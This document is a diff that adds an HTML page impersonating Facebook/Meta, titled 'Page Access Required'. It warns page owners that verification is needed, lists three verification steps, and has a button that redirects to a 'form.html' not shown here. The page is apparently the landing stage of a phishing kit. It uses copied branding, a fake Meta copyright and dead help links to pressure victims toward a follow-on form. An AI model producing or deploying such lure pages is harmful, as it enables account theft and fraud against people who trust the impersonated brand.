@@ -1,0 +1,309 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Page Access Required - Facebook</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #f0f2f5 0%, #e4e6eb 100%);
+            color: #1c1e21;
+            line-height: 1.5;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 500px;
+            width: 100%;
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+            transition: transform 0.3s ease;
+        }
+        
+        .container:hover {
+            transform: translateY(-5px);
+        }
+        
+        .header {
+            background: #1877f2;
+            color: white;
+            padding: 30px 20px;
+            text-align: center;
+        }
+        
+        .logo {
+            font-size: 36px;
+            font-weight: 700;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        
+        .logo i {
+            background: white;
+            color: #1877f2;
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+        }
+        
+        h1 {
+            font-size: 22px;
+            font-weight: 500;
+        }
+        
+        .content {
+            padding: 30px;
+        }
+        
+        .info-box {
+            background: #f7f9fc;
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 25px;
+            border-left: 4px solid #1877f2;
+        }
+        
+        .info-title {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 12px;
+            font-weight: 600;
+            color: #1877f2;
+        }
+        
+        p {
+            margin-bottom: 20px;
+            color: #606770;
+            font-size: 15px;
+        }
+        
+        .step-container {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            margin-bottom: 25px;
+        }
+        
+        .step {
+            display: flex;
+            gap: 15px;
+            padding: 15px;
+            border-radius: 8px;
+            background: #f7f9fc;
+            transition: all 0.2s;
+        }
+        
+        .step:hover {
+            background: #e7f3ff;
+            transform: translateX(5px);
+        }
+        
+        .step-number {
+            background: #1877f2;
+            color: white;
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+            font-weight: 600;
+        }
+        
+        .step-content h3 {
+            margin-bottom: 5px;
+            color: #1d2129;
+        }
+        
+        .step-content p {
+            margin-bottom: 0;
+            font-size: 14px;
+            color: #65676b;
+        }
+        
+        .btn {
+            width: 100%;
+            padding: 14px;
+            border-radius: 8px;
+            font-weight: 600;
+            font-size: 16px;
+            cursor: pointer;
+            border: none;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        
+        .btn-primary {
+            background: #1877f2;
+            color: white;
+            box-shadow: 0 4px 12px rgba(24, 119, 242, 0.3);
+        }
+        
+        .btn-primary:hover {
+            background: #166fe5;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 15px rgba(24, 119, 242, 0.4);
+        }
+        
+        .footer {
+            text-align: center;
+            padding: 20px;
+            background: #f0f2f5;
+            color: #65676b;
+            font-size: 13px;
+            border-top: 1px solid #e4e6eb;
+        }
+        
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin-top: 10px;
+            flex-wrap: wrap;
+        }
+        
+        .footer-links a {
+            color: #65676b;
+            text-decoration: none;
+            transition: color 0.2s;
+        }
+        
+        .footer-links a:hover {
+            color: #1877f2;
+            text-decoration: underline;
+        }
+        
+        .progress-container {
+            height: 6px;
+            background: #e4e6eb;
+            border-radius: 3px;
+            margin-bottom: 30px;
+            overflow: hidden;
+        }
+        
+        .progress-bar {
+            height: 100%;
+            width: 45%;
+            background: #1877f2;
+            border-radius: 3px;
+            animation: progress-pulse 2s infinite;
+        }
+        
+        @keyframes progress-pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.7; }
+            100% { opacity: 1; }
+        }
+        
+        @media (max-width: 480px) {
+            .container {
+                margin: 10px;
+            }
+            
+            .content {
+                padding: 20px 15px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo">
+                <i class="fab fa-facebook"></i>
+                <span>facebook</span>
+            </div>
+            <h1>Page Access Required</h1>
+        </div>
+        
+        <div class="content">
+            <div class="progress-container">
+                <div class="progress-bar"></div>
+            </div>
+            
+            <div class="info-box">
+                <div class="info-title">
+                    <i class="fas fa-info-circle"></i>
+                    <span>Page Access Information</span>
+                </div>
+                <p>To maintain account security, we require additional verification before you can access your page. This helps us ensure only authorized users manage pages.</p>
+            </div>
+            
+            <p>Complete these simple steps to restore access to your page:</p>
+            
+            <div class="step-container">
+                <div class="step">
+                    <div class="step-number">1</div>
+                    <div class="step-content">
+                        <h3>Identity Confirmation</h3>
+                        <p>Verify your account ownership</p>
+                    </div>
+                </div>
+                
+                <div class="step">
+                    <div class="step-number">2</div>
+                    <div class="step-content">
+                        <h3>Security Check</h3>
+                        <p>Confirm your recent activity</p>
+                    </div>
+                </div>
+                
+                <div class="step">
+                    <div class="step-number">3</div>
+                    <div class="step-content">
+                        <h3>Access Restoration</h3>
+                        <p>Regain full control of your page</p>
+                    </div>
+                </div>
+            </div>
+            
+            <button class="btn btn-primary" onclick="handleClick()">
+                <i class="fas fa-lock"></i>
+                Begin Verification
+            </button>
+        </div>
+        
+        <div class="footer">
+            <div>Meta © 2025</div>
+            <div class="footer-links">
+                <a href="#">Help Center</a>
+                <a href="#">Community Standards</a>
+                <a href="#">Privacy Policy</a>
+                <a href="#">Terms of Service</a>
+            </div>
+        </div>
+    </div>
+    <script>
+        function handleClick() {
+            window.location.href = 'form.html';
+        }
+    </script>
+</body>
+</html>
